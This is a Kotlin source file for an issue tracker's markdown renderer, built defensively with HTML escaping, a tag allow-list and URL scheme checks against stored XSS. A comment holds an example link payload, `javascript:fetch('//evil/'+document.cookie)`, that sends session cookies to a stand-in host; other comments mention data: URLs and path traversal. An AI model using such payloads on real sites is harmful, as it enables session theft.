/**
 * Markdown → HTML, with an allow-list and no passthrough.
 *
 * ── Why this file is security code ───────────────────────────────────────────
 *
 * The editor has an underline button. No flavour of markdown has underline —
 * deliberately, because underlined text on the web means "link" — so the stored
 * format is markdown **plus a little inline HTML**: `<u>text</u>`.
 *
 * That one decision is what makes this file dangerous. The stored document now
 * legitimately contains HTML, on a field any signed-in user can write and every
 * other user will read. A renderer that passed raw HTML through — which is what
 * "just support a bit of HTML" means in practice, and what almost every markdown
 * library does when you enable it — is **stored XSS**, straight into a page
 * carrying the reader's session cookie.
 *
 * So: nothing in the input is ever treated as markup. Every `<`, `>`, `&` and
 * `"` is escaped *first*, unconditionally, and the only tags in the output are
 * ones this file emits itself. `<u>` survives because [restoreAllowedTags] puts
 * it back afterwards, from the escaped text, by exact match — not because it was
 * let through.
 *
 * Written by hand rather than pulled in: a markdown library is a large
 * dependency whose HTML-handling default is the one thing that must not be
 * wrong, and the subset here is seven constructs.
 *
 * @see se.soderbjorn.lunicle.client.viewmodel.IssueBackingViewModel
 */
package se.soderbjorn.lunicle.client

import se.soderbjorn.lunicle.clientserver.ApiRoutes

/**
 * The inline HTML the editor may produce, and the *only* tags restored after
 * escaping.
 *
 * `<u>` and nothing else, because underline is the only button with no markdown
 * spelling. Adding to this list is adding to the attack surface: each entry is a
 * tag a user can put in an issue that every reader's browser will execute as
 * markup. Anything with an attribute — `<a href>`, `<img src>` — must never
 * appear here, because attributes are where javascript: URLs and event handlers
 * live. Links and images have markdown spellings and are built by this file with
 * their URLs checked; see [renderLinks] and [isSafeMarkdownUrl].
 */
private val ALLOWED_INLINE_TAGS = listOf("u")

/**
 * The characters a backslash may neutralise, and the whole reason backslash
 * escaping exists here at all.
 *
 * The WYSIWYG editor never shows markup, so the only way it can represent text
 * that *contains* a marker — someone typing "2 * 3 * 4", or "#1 in the list" —
 * is to escape it on the way out. Without this, [serialiseMarkdown] would emit
 * the markers raw, this file would read them back as formatting, and the user's
 * text would silently change into something they never wrote. That is exactly
 * the round-trip corruption the editor's preamble used to warn about, and this
 * is the half of the answer that lives on the rendering side.
 *
 * Deliberately only the characters this renderer acts on. Escaping more would
 * mean `\` before punctuation that means nothing here, and every one of those
 * would show up as a literal backslash the moment anything else read the stored
 * document.
 */
private const val ESCAPABLE = "\\*~`[]!<#-"

/** The subset that is significant anywhere in a line, as opposed to only at its start. */
private const val INLINE_ESCAPABLE = "\\*~`[]!<"

/**
 * Where an escaped character hides while the rules run.
 *
 * An escaped `*` cannot stay a `*` — the italic rule would match it — and it
 * cannot become its final text either, because that text has to be HTML-escaped
 * *after* [restoreAllowedTags] has had its say. So each one becomes a private-use
 * character, chosen because no rule in this file matches one and no keyboard
 * produces one, and turns back into itself at the very end.
 */
private const val PLACEHOLDER_BASE = '\uE000'

/**
 * Escape the markers that are significant mid-line, for [serialiseMarkdown].
 *
 * The block-level markers (`#`, `- `) are [escapeMarkdownBlock]'s job, because
 * whether they mean anything depends on where in the line they sit — a `-` in
 * "well-formed" is a hyphen, and escaping every one of them would litter the
 * stored document for nothing.
 */
fun escapeMarkdown(text: String): String = buildString(text.length) {
    text.forEach { c ->
        if (c in INLINE_ESCAPABLE) append('\\')
        append(c)
    }
}

/**
 * Escape a line that would otherwise be read as a heading or a list item.
 *
 * Applied to an assembled paragraph, per line: "# 1 sold" typed as prose is a
 * paragraph in the editor, and must not come back as an `<h1>`.
 */
fun escapeMarkdownBlock(text: String): String =
    text.lines().joinToString("\n") { line ->
        if (BLOCK_MARKER.containsMatchIn(line)) {
            val indent = line.takeWhile { it == ' ' }
            indent + "\\" + line.drop(indent.length)
        } else {
            line
        }
    }

private val BLOCK_MARKER = Regex("^ *(#{1,6} |- )")

/** Swap each `\x` for its placeholder, before anything else can read the `x`. */
private fun extractEscapes(text: String): String = buildString(text.length) {
    var i = 0
    while (i < text.length) {
        val c = text[i]
        val slot = if (c == '\\' && i + 1 < text.length) ESCAPABLE.indexOf(text[i + 1]) else -1
        if (slot >= 0) {
            append(PLACEHOLDER_BASE + slot)
            i += 2
        } else {
            // A backslash before anything else is just a backslash. Swallowing
            // it would corrupt a Windows path someone pasted into an issue.
            append(c)
            i++
        }
    }
}

/** Turn the placeholders back into their characters, HTML-escaped as text. */
private fun restoreEscapes(text: String): String = buildString(text.length) {
    text.forEach { c ->
        val slot = c - PLACEHOLDER_BASE
        if (slot in ESCAPABLE.indices) append(ESCAPABLE[slot].toString().escapeHtml()) else append(c)
    }
}

/**
 * Drop any placeholder character the input already contained.
 *
 * Otherwise the input could forge one: a document containing U+E007 literally
 * would come out the other end as a `[`, having never been escaped — a way to
 * smuggle a marker past the rules that is not available to anyone typing.
 */
private fun stripPlaceholders(text: String): String =
    text.filter { (it - PLACEHOLDER_BASE) !in ESCAPABLE.indices }

/**
 * Escape everything. The first thing that happens to any input, always.
 *
 * `"` and `'` are escaped along with the obvious three because rendered text
 * lands inside attribute values in [renderImages] and [renderLinks] — an
 * unescaped quote there closes the attribute and opens a tag.
 */
private fun String.escapeHtml(): String = buildString(length) {
    this@escapeHtml.forEach { c ->
        when (c) {
            '&' -> append("&amp;")
            '<' -> append("&lt;")
            '>' -> append("&gt;")
            '"' -> append("&quot;")
            '\'' -> append("&#39;")
            else -> append(c)
        }
    }
}

/**
 * Is this URL safe to put in an `href` or a `src`?
 *
 * Public because the editor asks it too, before putting a typed URL into a live
 * `href` in the document being edited. Same question, same answer, one
 * implementation — a second scheme check written on the editor's side is a
 * second thing to get wrong.
 *
 * An allow-list of schemes, because the interesting attack is not a tag at all:
 * `[click](javascript:fetch('//evil/'+document.cookie))` is valid markdown, and
 * a renderer that emits the href verbatim has just executed a script on click.
 * `data:` is refused for the same reason — `data:text/html,...` in an href is a
 * same-tab navigation into attacker-controlled HTML.
 *
 * Relative URLs are allowed, and are the common case: every uploaded image is
 * `/api/attachments/<id>`.
 */
fun isSafeMarkdownUrl(url: String): Boolean {
    val trimmed = url.trim().lowercase()
    // A scheme-relative URL (//evil.example) inherits our scheme and is a real
    // off-site link, but it is also a legitimate thing to write. It is the
    // colon-bearing schemes that decide execution, so those are what is checked.
    if (!trimmed.contains(':')) return true
    return trimmed.startsWith("http://") ||
        trimmed.startsWith("https://") ||
        trimmed.startsWith("mailto:")
}

/**
 * Render markdown to HTML that is safe to assign to `innerHTML`.
 *
 * Supports exactly what the editor's toolbar can produce: headings, bold,
 * italic, strikethrough, inline code, links, images, and `<u>`. Everything else
 * is text.
 *
 * @param markdown the stored document.
 * @return HTML with no tag in it that this file did not emit.
 */
fun renderMarkdown(markdown: String): String {
    // Backslash escapes come out first, into placeholders. This has to precede
    // escapeHtml: "\<" must be recognised while it is still a "<", and one line
    // further down it is the string "&lt;".
    val source = extractEscapes(stripPlaceholders(markdown))

    // Escape SECOND, and before any rule runs. Everything below operates on
    // already-escaped text, so a "<script>" in the source is the literal string
    // "&lt;script&gt;" by the time any rule sees it, and no rule can turn it
    // back into a tag. Placeholders pass through untouched — they are none of
    // the five characters this escapes.
    val escaped = source.escapeHtml()

    val blocks = escaped.split("\n\n")
    val rendered = blocks.mapNotNull { block ->
        val trimmed = block.trim()
        if (trimmed.isEmpty()) return@mapNotNull null
        renderBlock(trimmed)
    }.joinToString("\n")

    // Placeholders resolve LAST, after restoreAllowedTags has run inside every
    // block. The order matters and is not obvious: an escaped "<" that resolved
    // any earlier would be a "&lt;" sitting next to the "&gt;" of an unescaped
    // ">", and restoreAllowedTags — which matches "&lt;u&gt;" by exact string —
    // would turn the text someone escaped precisely to keep inert back into a
    // real <u> tag.
    return restoreEscapes(rendered)
}

/**
 * One paragraph, heading, or list.
 *
 * A heading is a *line*, not a block, so "# Title" followed by a line of prose
 * is a heading and a paragraph rather than one odd-looking heading. Handled by
 * splitting the block rather than with a dot-matches-all regex, because that
 * option is JVM-only — `RegexOption.DOT_MATCHES_ALL` does not exist on
 * Kotlin/JS, and this file is common code compiled for both.
 */
private fun renderBlock(block: String): String {
    val lines = block.lines().filter { it.isNotBlank() }
    if (lines.isEmpty()) return ""

    if (lines.all { it.trimStart().startsWith("- ") }) {
        val items = lines.joinToString("") { "<li>${renderInline(it.trimStart().removePrefix("- "))}</li>" }
        return "<ul>$items</ul>"
    }

    val heading = HEADING.find(lines.first())
    if (heading != null) {
        val level = heading.groupValues[1].length
        val rendered = "<h$level>${renderInline(heading.groupValues[2].trim())}</h$level>"
        val rest = lines.drop(1)
        return if (rest.isEmpty()) rendered else rendered + "\n" + paragraph(rest.joinToString("\n"))
    }

    return paragraph(block)
}

/** Headings: # through ######, matching the toolbar's buttons. Seven is not a heading. */
private val HEADING = Regex("^(#{1,6})\\s+(.*)$")

/**
 * A paragraph.
 *
 * A single newline becomes a line break, which is what someone typing into a
 * textarea means by it. Markdown's "two trailing spaces" rule is a trap nobody
 * discovers on purpose, and invisible in the field where it would have to be
 * typed.
 */
private fun paragraph(text: String): String =
    "<p>${renderInline(text).replace("\n", "<br>")}</p>"

/** Inline rules, in an order that matters — see the comments. */
private fun renderInline(text: String): String {
    var out = text

    // Images before links: the syntaxes differ only by a leading "!", so the
    // link rule would happily match the "[alt](url)" half of an image and leave
    // a stray "!" in front of an <a>.
    out = renderImages(out)
    out = renderLinks(out)

    // Bold before italic, and the order is load-bearing: "**x**" contains "*x*",
    // so italic first would eat the inner pair and leave "*<em>x</em>*".
    //
    // Running bold first is also what lets the italic rule stay simple. By the
    // time it runs, every "**" has already become a <strong>, so any "*" still
    // standing is an italic marker — no lookbehind needed to tell them apart.
    // That matters: lookbehind is ES2018, and Safari did not ship it until
    // 16.4, so a regex using it compiles happily and then fails at runtime in
    // one browser.
    out = out.replace(Regex("\\*\\*([^*]+)\\*\\*"), "<strong>$1</strong>")
    out = out.replace(Regex("\\*([^*\\n]+)\\*"), "<em>$1</em>")
    out = out.replace(Regex("~~([^~]+)~~"), "<del>$1</del>")
    out = out.replace(Regex("`([^`]+)`"), "<code>$1</code>")

    return restoreAllowedTags(out)
}

/**
 * `![alt](url)` → `<img>`.
 *
 * The alt text is already escaped and lands in an attribute, which is why
 * [escapeHtml] escapes quotes. A refused URL renders as the alt text alone
 * rather than vanishing: silently dropping content a user wrote is worse than
 * showing it inertly.
 *
 * The `\]` must stay escaped, here and in [renderLinks]. A bare `]` outside a
 * character class is legal on the JVM and legal in a plain JavaScript regex —
 * and a **SyntaxError** in a unicode-mode one, which is what Kotlin/JS compiles
 * every [Regex] to (`/…/gu`). So the unescaped version passes `jvmTest`, passes
 * review, and then throws "Lone quantifier brackets" in the browser the first
 * time anyone renders a description. Only `jsTest` catches it.
 */
private fun renderImages(text: String): String =
    Regex("!\\[([^\\]]*)\\]\\(([^)\\s]+)\\)").replace(text) { match ->
        val alt = match.groupValues[1]
        val url = match.groupValues[2]
        if (isSafeMarkdownUrl(url)) "<img src=\"$url\" alt=\"$alt\">" else alt
    }

/**
 * `[text](url)` → `<a>`.
 *
 * `rel="noopener noreferrer"` because these open in a new tab, and a page opened
 * with `target=_blank` can otherwise reach back through `window.opener` and
 * navigate the tab that opened it. `noreferrer` keeps an issue's URL — which may
 * name a private project — out of the destination's logs.
 */
private fun renderLinks(text: String): String =
    Regex("\\[([^\\]]*)\\]\\(([^)\\s]+)\\)").replace(text) { match ->
        val label = match.groupValues[1]
        val url = match.groupValues[2]
        when {
            !isSafeMarkdownUrl(url) -> label
            isAttachmentUrl(url) -> attachmentLink(url, label)
            else -> "<a href=\"$url\" target=\"_blank\" rel=\"noopener noreferrer\">$label</a>"
        }
    }

/**
 * Is this link one of our own uploaded files?
 *
 * Asked of the *escaped* text, and safe to be: an attachment URL is a fixed
 * prefix and digits, none of which are among the five characters [escapeHtml]
 * touches, so the URL that reaches here is byte-for-byte the one that was
 * stored. Nothing has to be un-escaped to ask this question.
 *
 * The trailing digits are checked rather than assumed. It is what confines the
 * attachment path to a URL this app could actually have produced —
 * `/api/attachments/../../secret` is a link like any other, and gets a link's
 * treatment.
 *
 * `startsWith` rather than a [Regex] built from the prefix, because building one
 * would mean escaping the prefix into a pattern, and this file has already been
 * bitten once by a regex that was legal on the JVM and a SyntaxError in the
 * browser — see [renderImages]. There is no pattern here to be wrong.
 *
 * A user can of course type this URL by hand into a link and get a download
 * affordance for a file that is not theirs. It costs nothing: the route answers
 * 404 to a reader who cannot see the owning project, so the affordance is a lie
 * the server immediately corrects.
 */
private fun isAttachmentUrl(url: String): Boolean {
    if (!url.startsWith(ApiRoutes.ATTACHMENT_PREFIX)) return false
    val id = url.removePrefix(ApiRoutes.ATTACHMENT_PREFIX)
    return id.isNotEmpty() && id.all { it in '0'..'9' }
}

/**
 * `[report.pdf (2.3 MB)](/api/attachments/12)` → a download.
 *
 * ── Why the renderer draws this and not the editor ──────────────────────────
 *
 * Because the stored document must stay markdown, and markdown has one spelling
 * for a link. There is no `[x](url){.attachment}` here, and inventing one would
 * mean the serialiser has to emit it and this file has to parse it — two new
 * things to get wrong, to express something the URL already says. So the
 * markdown is an ordinary link and *this* function decides how it looks, from
 * the URL alone. The serialiser reads the `href` back out and emits the same
 * ordinary link, and the round-trip is closed without either side knowing that
 * attachments exist. See MarkdownSerialiser.kt.
 *
 * `download` rather than `target="_blank"`: this URL answers with
 * `Content-Disposition: attachment`, so a new tab would open, download, and shut
 * again — a flash of nothing that reads as a broken link. The attribute has no
 * value, deliberately. Given one, it would name the saved file, and the only
 * name available here is the label, which by then also carries "(2.3 MB)"; bare,
 * the browser takes the filename from the header, which is the real one.
 *
 * The class is what the CSS hangs the icon and the box off — a download does not
 * look like a link, because clicking it does not do what a link does. There is
 * no user text in either attribute, so there is nothing here to escape that
 * [escapeHtml] has not already dealt with; the URL is a fixed prefix and digits
 * by the time [isAttachmentUrl] has agreed to this path.
 */
private fun attachmentLink(url: String, label: String): String =
    "<a href=\"$url\" class=\"attachment\" download rel=\"noopener noreferrer\">$label</a>"

/**
 * Turn the escaped `&lt;u&gt;` back into a real `<u>`.
 *
 * This is the *only* path by which a tag from the source document reaches the
 * output, and it is an exact-match substitution on a fixed list rather than
 * anything that parses. `<u foo="bar">` does not match and stays escaped, which
 * is the point: there is no attribute to smuggle a handler into, because there
 * is no attribute at all.
 */
private fun restoreAllowedTags(text: String): String {
    var out = text
    ALLOWED_INLINE_TAGS.forEach { tag ->
        out = out.replace("&lt;$tag&gt;", "<$tag>").replace("&lt;/$tag&gt;", "</$tag>")
    }
    return out
}
